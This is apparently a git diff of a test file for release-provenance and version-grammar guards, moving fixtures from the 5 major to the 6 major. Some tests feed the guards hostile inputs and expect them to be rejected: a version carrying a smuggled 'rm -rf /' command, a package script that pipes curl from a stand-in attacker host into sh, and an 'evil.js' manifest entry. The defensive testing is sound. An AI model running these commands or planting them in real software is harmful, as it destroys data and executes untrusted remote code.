@@ -36,7 +36,7 @@ const VALID_RUN = {
   path: '.github/workflows/build-tarballs.yml',
   conclusion: 'success',
   status: 'completed',
-  head_branch: 'v5.260714.1',
+  head_branch: 'v6.260714.1',
   head_sha: 'a'.repeat(40),
 };
 
@@ -49,9 +49,9 @@ function runJson(root: string, overrides: Record<string, unknown> = {}): string 
 const PROVENANCE_ENV = {
   EXPECTED_REPO: 'automagik-dev/genie',
   EXPECTED_WORKFLOW: '.github/workflows/build-tarballs.yml',
-  EXPECTED_REF: 'refs/tags/v5.260714.1',
+  EXPECTED_REF: 'refs/tags/v6.260714.1',
   EXPECTED_SHA: 'a'.repeat(40),
-  EXPECTED_VERSION: '5.260714.1',
+  EXPECTED_VERSION: '6.260714.1',
 };
 
 describe('require-dispatch-tag (F16 ref guard)', () => {
@@ -65,9 +65,9 @@ describe('require-dispatch-tag (F16 ref guard)', () => {
   test('dev-channel dispatch on the freshly-pushed v<version> tag is allowed (HARD INVARIANT)', () => {
     const result = guard('require-dispatch-tag', {
       EVENT: 'workflow_dispatch',
-      REF: 'refs/tags/v5.260714.1',
+      REF: 'refs/tags/v6.260714.1',
       CHANNEL: 'dev',
-      VERSION: '5.260714.1',
+      VERSION: '6.260714.1',
     });
     expect(result.exitCode).toBe(0);
   });
@@ -75,7 +75,7 @@ describe('require-dispatch-tag (F16 ref guard)', () => {
   test('stable dispatch on a valid tag is allowed', () => {
     const result = guard('require-dispatch-tag', {
       EVENT: 'workflow_dispatch',
-      REF: 'refs/tags/v5.260714.1',
+      REF: 'refs/tags/v6.260714.1',
       CHANNEL: 'stable',
     });
     expect(result.exitCode).toBe(0);
@@ -100,8 +100,8 @@ describe('require-dispatch-tag (F16 ref guard)', () => {
   test('a version input that does not match the dispatched tag fails closed', () => {
     const result = guard('require-dispatch-tag', {
       EVENT: 'workflow_dispatch',
-      REF: 'refs/tags/v5.260714.1',
-      VERSION: '5.260714.2',
+      REF: 'refs/tags/v6.260714.1',
+      VERSION: '6.260714.2',
     });
     expect(result.exitCode).toBe(3);
     expect(result.stderr.toString()).toContain('does not match dispatched tag');
@@ -110,8 +110,8 @@ describe('require-dispatch-tag (F16 ref guard)', () => {
   test('a version input failing the grammar fails closed', () => {
     const result = guard('require-dispatch-tag', {
       EVENT: 'workflow_dispatch',
-      REF: 'refs/tags/v5.260714.1',
-      VERSION: '5.260714.1; rm -rf /',
+      REF: 'refs/tags/v6.260714.1',
+      VERSION: '6.260714.1; rm -rf /',
     });
     expect(result.exitCode).toBe(3);
   });
@@ -119,15 +119,15 @@ describe('require-dispatch-tag (F16 ref guard)', () => {
   test('suffix-bearing versions fail before release assets or manifests can diverge', () => {
     const result = guard('require-dispatch-tag', {
       EVENT: 'workflow_dispatch',
-      REF: 'refs/tags/v5.260714.1-rc.1',
-      VERSION: '5.260714.1-rc.1',
+      REF: 'refs/tags/v6.260714.1-rc.1',
+      VERSION: '6.260714.1-rc.1',
       CHANNEL: 'dev',
     });
     expect(result.exitCode).toBe(3);
   });
 
-  test('generic semver, impossible dates, zero counters, and oversized counters are rejected', () => {
-    for (const version of ['6.260714.1', '5.261332.1', '5.260229.1', '5.260714.0', '5.260714.10000']) {
+  test('a foreign major, impossible dates, zero counters, and oversized counters are rejected', () => {
+    for (const version of ['7.260714.1', '6.261332.1', '6.260229.1', '6.260714.0', '6.260714.10000']) {
       const result = guard('require-dispatch-tag', {
         EVENT: 'workflow_dispatch',
         REF: `refs/tags/v${version}`,
@@ -139,8 +139,48 @@ describe('require-dispatch-tag (F16 ref guard)', () => {
     expect(
       guard('require-dispatch-tag', {
         EVENT: 'workflow_dispatch',
-        REF: 'refs/tags/v5.240229.1',
-        VERSION: '5.240229.1',
+        REF: 'refs/tags/v6.240229.1',
+        VERSION: '6.240229.1',
+        CHANNEL: 'dev',
+      }).exitCode,
+    ).toBe(0);
+  });
+
+  /**
+   * The v6 major cut. `VERSION_RE`/`TAG_REF_RE` pin the leading major, so the
+   * retired `5.` scheme must now fail closed on BOTH inputs the guard reads —
+   * the tag ref and the version input — and only `6.` may pass. This guard is
+   * loaded from the control ref (main), so on dev this test is the only thing
+   * the change binds until the promotion merge carries it to main.
+   */
+  test('the retired 5. major is rejected and the 6. major is accepted', () => {
+    // The tag ref itself: TAG_REF_RE rejects v5 before the version input is read.
+    const retiredTag = guard('require-dispatch-tag', {
+      EVENT: 'workflow_dispatch',
+      REF: 'refs/tags/v5.260714.1',
+      VERSION: '5.260714.1',
+      CHANNEL: 'dev',
+    });
+    expect(retiredTag.exitCode).toBe(3);
+    expect(retiredTag.stderr.toString()).toContain('non-tag ref');
+
+    // The version input on its own: VERSION_RE rejects a 5-major version even
+    // when the dispatched tag is a well-formed v6 tag.
+    const retiredVersion = guard('require-dispatch-tag', {
+      EVENT: 'workflow_dispatch',
+      REF: 'refs/tags/v6.260714.1',
+      VERSION: '5.260714.1',
+      CHANNEL: 'dev',
+    });
+    expect(retiredVersion.exitCode).toBe(3);
+    expect(retiredVersion.stderr.toString()).toContain('fails the release version grammar');
+
+    // The same shape on the 6. major passes both checks.
+    expect(
+      guard('require-dispatch-tag', {
+        EVENT: 'workflow_dispatch',
+        REF: 'refs/tags/v6.260714.1',
+        VERSION: '6.260714.1',
         CHANNEL: 'dev',
       }).exitCode,
     ).toBe(0);
@@ -214,7 +254,7 @@ describe('guard-run-provenance (orchestrated vs break-glass)', () => {
       RUN_ID: '',
       EXPECTED_REPO: 'automagik-dev/genie',
       EXPECTED_WORKFLOW: '.github/workflows/build-tarballs.yml',
-      EXPECTED_REF: 'refs/tags/v5.260714.1',
+      EXPECTED_REF: 'refs/tags/v6.260714.1',
     });
     expect(result.exitCode).toBe(0);
   });
@@ -319,20 +359,20 @@ function versionRepo(packageScript?: string) {
   git(root, 'init', '-q');
   git(root, 'config', 'user.name', 'fixture');
   git(root, 'config', 'user.email', 'fixture@example.invalid');
-  writeVersionTree(root, '5.260714.1');
+  writeVersionTree(root, '6.260714.1');
   git(root, 'add', '.');
   git(root, 'commit', '-qm', 'parent');
   const parent = git(root, 'rev-parse', 'HEAD');
-  writeVersionTree(root, '5.260714.2', packageScript);
+  writeVersionTree(root, '6.260714.2', packageScript);
   git(root, 'add', '.');
-  git(root, 'commit', '-qm', 'chore(version): bump to 5.260714.2 [auto-version]');
+  git(root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
   return { root, parent, child: git(root, 'rev-parse', 'HEAD') };
 }
 
 describe('check-version-child (parent CI inheritance)', () => {
   test('accepts the exact deterministic version-only child', () => {
     const fixture = versionRepo();
-    const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '5.260714.2'], fixture.root);
+    const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '6.260714.2'], fixture.root);
     expect(result.exitCode).toBe(0);
   });
 
@@ -342,38 +382,38 @@ describe('check-version-child (parent CI inheritance)', () => {
   test('accepts a version-only child that omits the native Orca manifest', () => {
     const fixture = versionRepo();
     git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
-    writeVersionTree(fixture.root, '5.260714.2');
+    writeVersionTree(fixture.root, '6.260714.2');
     git(fixture.root, 'checkout', '-q', fixture.parent, '--', 'plugins/genie/orca-plugin.json');
     git(fixture.root, 'add', '.');
-    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 5.260714.2 [auto-version]');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
     const child = git(fixture.root, 'rev-parse', 'HEAD');
     expect(git(fixture.root, 'diff', '--name-only', fixture.parent, child).split('\n')).not.toContain(
       'plugins/genie/orca-plugin.json',
     );
 
-    const result = guard('check-version-child', {}, [fixture.parent, child, '5.260714.2'], fixture.root);
+    const result = guard('check-version-child', {}, [fixture.parent, child, '6.260714.2'], fixture.root);
     expect(result.exitCode).toBe(0);
   });
 
   test('still rejects a child whose Orca manifest bump is not version-only', () => {
     const fixture = versionRepo();
     git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
-    writeVersionTree(fixture.root, '5.260714.2');
+    writeVersionTree(fixture.root, '6.260714.2');
     writeFileSync(
       join(fixture.root, 'plugins/genie/orca-plugin.json'),
-      `${JSON.stringify({ id: 'genie', version: '5.260714.2', main: 'evil.js' }, null, 2)}\n`,
+      `${JSON.stringify({ id: 'genie', version: '6.260714.2', main: 'evil.js' }, null, 2)}\n`,
     );
     git(fixture.root, 'add', '.');
-    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 5.260714.2 [auto-version]');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
     const child = git(fixture.root, 'rev-parse', 'HEAD');
 
-    const result = guard('check-version-child', {}, [fixture.parent, child, '5.260714.2'], fixture.root);
+    const result = guard('check-version-child', {}, [fixture.parent, child, '6.260714.2'], fixture.root);
     expect(result.exitCode).toBe(3);
   });
 
   test('rejects a package script smuggled inside an otherwise allowlisted version file', () => {
     const fixture = versionRepo('curl https://attacker.invalid | sh');
-    const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '5.260714.2'], fixture.root);
+    const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '6.260714.2'], fixture.root);
     expect(result.exitCode).toBe(3);
     expect(result.stderr.toString()).toContain('not the deterministic version-only child');
   });
@@ -432,7 +472,7 @@ function controlRepo() {
   const approved = git(root, 'rev-parse', 'HEAD');
 
   mkdirSync(join(root, '.well-known'), { recursive: true });
-  writeFileSync(join(root, '.well-known', 'dev.json'), '{"version":"5.260714.2"}\n');
+  writeFileSync(join(root, '.well-known', 'dev.json'), '{"version":"6.260714.2"}\n');
   git(root, 'add', '.well-known/dev.json');
   git(root, 'commit', '-qm', 'chore(release): update dev manifest');
   return { root, approved, manifest: git(root, 'rev-parse', 'HEAD') };
@@ -538,7 +578,7 @@ const TRUSTED_ENV = {
   DISPATCH_ACTOR: 'release-maintainer-a',
   TRIGGERING_ACTOR: 'release-maintainer-a',
   RUN_ATTEMPT: '1',
-  VERSION: '5.260714.2',
+  VERSION: '6.260714.2',
   CHANNEL: 'dev',
   SOURCE_SHA: TRUSTED_SOURCE_SHA,
   SOURCE_BRANCH: 'dev',
@@ -630,7 +670,7 @@ describe('check-trusted-release (main control + source provenance)', () => {
     const root = mkroot('genie-trusted-reject-');
     const args = [trustedRunFile(root), controlRunsFile(root)];
     for (const env of [
-      { ...TRUSTED_ENV, CONTROL_REF: 'refs/tags/v5.260714.2' },
+      { ...TRUSTED_ENV, CONTROL_REF: 'refs/tags/v6.260714.2' },
       { ...TRUSTED_ENV, ACTUAL_TAG_SHA: 'd'.repeat(40) },
       { ...TRUSTED_ENV, VERSION_ONLY_MATCH: 'false' },
       { ...TRUSTED_ENV, EVENT: 'workflow_dispatch' },
